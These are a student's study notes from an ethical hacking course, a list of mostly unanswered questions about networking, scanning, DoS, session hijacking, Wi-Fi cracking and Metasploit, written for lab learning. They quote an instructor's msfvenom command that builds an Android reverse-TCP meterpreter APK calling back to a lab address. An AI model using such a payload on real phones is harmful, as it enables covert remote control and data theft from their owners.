1. is IP address can't be starting with 0 like this 0.012.322.333 ❌ , but initially 0 can be like this 012.223.112.999 ✔ - am i correct or wrong ? <br>Ques 1 : is 0.192.168.1 & 192.168.1.0 - is this IP address is correct or not ? & if not then why - ask for reason 

--- 

- lecture no. 27 - Android Hacking using Msfvenom & Ahmyth
- sir wrote the command : `msfvenom -p android/meterpreter_reverse_tcp lhost 192.168.133.128 lport 8686 >amit.apk`
	- Q Doubt 0 : if we make connection local to local system in vmware <br>then we can take any port no. , so can we actually take any port no. <br>Q Doubt 1 : consider we're making connection b/w local to local system <br>then why sir only took 8686 as a port no. <br>Q Doubt 2 : can we take port no. like 80 or something else <br>Q Doubt 3 : how to decided which port no. we can take to make connection
	- Ans of all 3 Qs  : 
		- 

---
- lecture no. - 14
- lecture name : network scanning 
- sir said : so "TCP" - can be scanned easily on 1 or 2 Ports , if TCP makes scanning on Port no. `65535` <br>then firewall will block
	- doubt : 
		- 1) is u meant that TCP can be scanned on Port no. `1` or `2`  OR did u mean 1 or 2 ports 
			- Ans : 
	- extra doubt : is any specific port no. used by TCP to establish connection with the IP address of a system
- sir said : when we do `netdiscover` & 1st & 2nd IP addresses are of Vmare's Virtiual router 
	- Doubt : 
		- so is that same statement will be applied in actual machine if we do ethical hacking via actual machines <br>currently we're doing hacking virtually 

---
- lecture no. 26 , name : concept of DOS attack
- practical work of hping3 
	- Doubt : in metasploitable2 , when we're running `cat /dev/urandom` - then sounds coming & sometimes sound coming
	- Q : how to turn ON or OFF before running `cat /dev/urandom`
	- Ans : 

---
Q : for what purpose private Static IP address 
	<br>- is it like when we share anything via bluetooth then private Static IP address being used , if not - then where give example

---
- lecture no. 27 & 28 , name : DOS attack practical & Session Hijacking
- Pratical : in DOS Attack practical - we used BurpSuite Tool <br>& in session Hijacking - we used Wireshark <br>- in both cases , we used different tools to intercept the data packets
- Doubt : can't we used BurpSuite tool in Session Hijacking - cuz we're intercepting the data packet request <br>- when user was login inside testphpvuln.com
- Ans : 

---
- Lecture 17 ✔
- lecture name : 
- sir run this command : `mount -o nfs 192.168.59.130:/ /home/kali/Desktop/Mount/`
	- Doubt : 

---

- lecture 17 to 19 ✔
- doubt : in these lectures , why we're using only msfconsole tool <br>- is that the reason that victim's system is metasploit that's why or not ?

--- 
- lecture 18 ✔
- lecture name : More About Exploitation & Armitage
- sir : when sir was doing exploit on tomcat then we're getting error i.e 500 internal server error
	- Doubt : i tried via msfconsole & even but same issue coming
	- Ans : 
--- 

- what does mean "found shell OR shell opened" when we hack a system ✔
- Ans : 

---

- lecture 34
- lecture name : cryptography
- sir said : that Substitution cipher technique takes 4 pairs from the plain text like message is "i am devendra"
	- timeline : 24:02 - 27:23
	- Doubt : is Substitution cipher technique actually takes 4 pairs or not  <br>if yes - then is it also skip next 4 pair - then it'll take next 4 pair for encryption<br>Ans : 
	- Doubt : is it also takes a space as a plain text <br>Ans : 

---

- lecture 30 , name - wifi hacking
- Doubt 1 : is wifi router save the mac address of a connected device
	- Ans : 
- Doubt 2 : cracking the password (which has WPA2 encryption) - & after running a common word list passwords <br>then let's say password still not cracked from that handshake file <br>- then what's the 2nd option - which was sir saying (but he didn't show the 2nd solution)
	- Ans : 

---

general doubt
- Q : how to check private vs Public IP on my PC
	- Doubt : when i executed `ipconfing` in cmd as administration - then which one is my private IP
	- Ans : 
- Q : if someone hacked a person's IP address then what that hacker can do<br>Q : how i can protect if someone hacked my IP address 
	- Ans : 
- Q : what is a payload or payload is a malicious scripts<br>Q : how is it different from virus & worm

---



--- 

- Q : parrot os vs kali linux os 2024 <br>Ans : <br>> Do hackers use ParrotOS? <br>Ans : Parrot Security OS and Kali are both used for Penetration testing and both are are Debian OS. If you go with the Kali you can use metasploit tool which is used for several reasons including System Hacking and Mobile Hacking. **This is not present in Parrot Security OS**.
	- [Kali Linux vs Parrot OS. Introduction | by S12 Pentest | Medium](https://medium.com/@ssalssa.1.12.2.1.2.1/kali-linux-vs-parrot-os-704b85972821)
	- Q : Why Kali is better than parrot ? <br>Ans : **Kali has all the basic hacking tools**, while Parrot also adds its own tools such as AnonSurf, Wifiphisher, Airgeddon. Kali has more than 300 pentesting and IT audit tools, while Parrot has more than 750 well-known cybersecurity applications.


---

- what is the syntax for deleting a report in msf6/msfconsole database in kali linux ✔
	- i tried to delete a specific report via "db_destroy" but it's not working
	- sir even said that remove that hosts report file from the folder then it'll automatically will be removed <br>but is there any command ?
	- doubt : i removed all the hosts successfully via armitage GUI , <br>but is there any cli command to remove the particular host/report in msfconsole
	- Ans : sir said , use `db_remove <host/IPaddress>` <br>- & generally we don't remove cuz if we do so - then further services related to msfconsole will also removed <br>- so do 

---

1. for guidance 
	- for get a job/internship into Ethical Hacking or cyber security what should i need to do <br>- Eg : Reddit eg : should i do CompTIA certs (A+, Net+, Sec+) - are these useful to do or any impact will happen in my resume

--- 

### Doubts after going through the course 

1. privilege escalation
   - Q : step by step process how to do privilege escalation on parrotOS
   - Mine advice : it's a big standalone topic - which u need to dig into deep
- 


--- 

### Guidance after course
- Q : in which i need to be updated & in which field not <br>Eg : so i need to keep update in CEH , penetration & in which field not need to be updated
- Q : will ai replace Ethical hackers , cuz u saw penetestGPT on github